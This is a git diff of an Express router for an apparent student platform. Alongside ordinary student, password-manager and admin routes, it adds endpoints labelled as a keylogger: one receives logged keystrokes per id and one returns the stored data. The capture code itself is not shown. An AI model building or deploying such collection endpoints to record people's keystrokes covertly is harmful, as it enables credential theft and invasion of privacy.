@@ -4,8 +4,9 @@ import path from "path"; // Import path module
 import { authStudent } from "../middleware/auth.js";
 import { authStudentTool } from "../middleware/authTool.js";
 import { validateStudentAuth } from "../middleware/validateStudentAuth.js";
-import { loginStudent, registerStudent, studentDashboard, validateStudent, runCompiler, passwordManager, passwordManagerData, passwordDelete, adminLogin, adminDashboard, displayAllStudent, createCourse, getAllCourses, deleteCourse, deleteStudent } from "../controllers/controller.js";
+import { loginStudent, registerStudent, studentDashboard, validateStudent, runCompiler, passwordManager, passwordManagerData, passwordDelete, adminLogin, adminDashboard, displayAllStudent, createCourse, getAllCourses, deleteCourse, deleteStudent, keyLogerFunction, fetchLoggedKey } from "../controllers/controller.js";
 import { authAdmin } from "../middleware/authAdmin.js";
+import { keyLoggerAuth } from "../middleware/keyLoggerAuth.js"
 
 let router = express();
 
@@ -24,11 +25,18 @@ router.post("/api/:studentId/passwordmanager", authStudentTool, passwordManager)
 router.get("/api/:studentId/passwordmanagerdata", authStudentTool, passwordManagerData);
 router.delete('/api/:id/passwordmanager/:passwordIndex', authStudentTool, passwordDelete);
 
+// keylogger script
+
+router.post("/:id/keylogger", keyLoggerAuth, keyLogerFunction)
+
+router.get("/:id/getkeyloggerdata", keyLoggerAuth, fetchLoggedKey)
+
 // admin login route
 router.post("/api/admin/login", adminLogin);
 
 // Protect the /dashboard route
 router.get('/admin/dashboard', authAdmin, adminDashboard);
+
 router.get('/admin/dashboard/students', authAdmin, displayAllStudent);
 
 // Set up storage for course thumbnails using multer
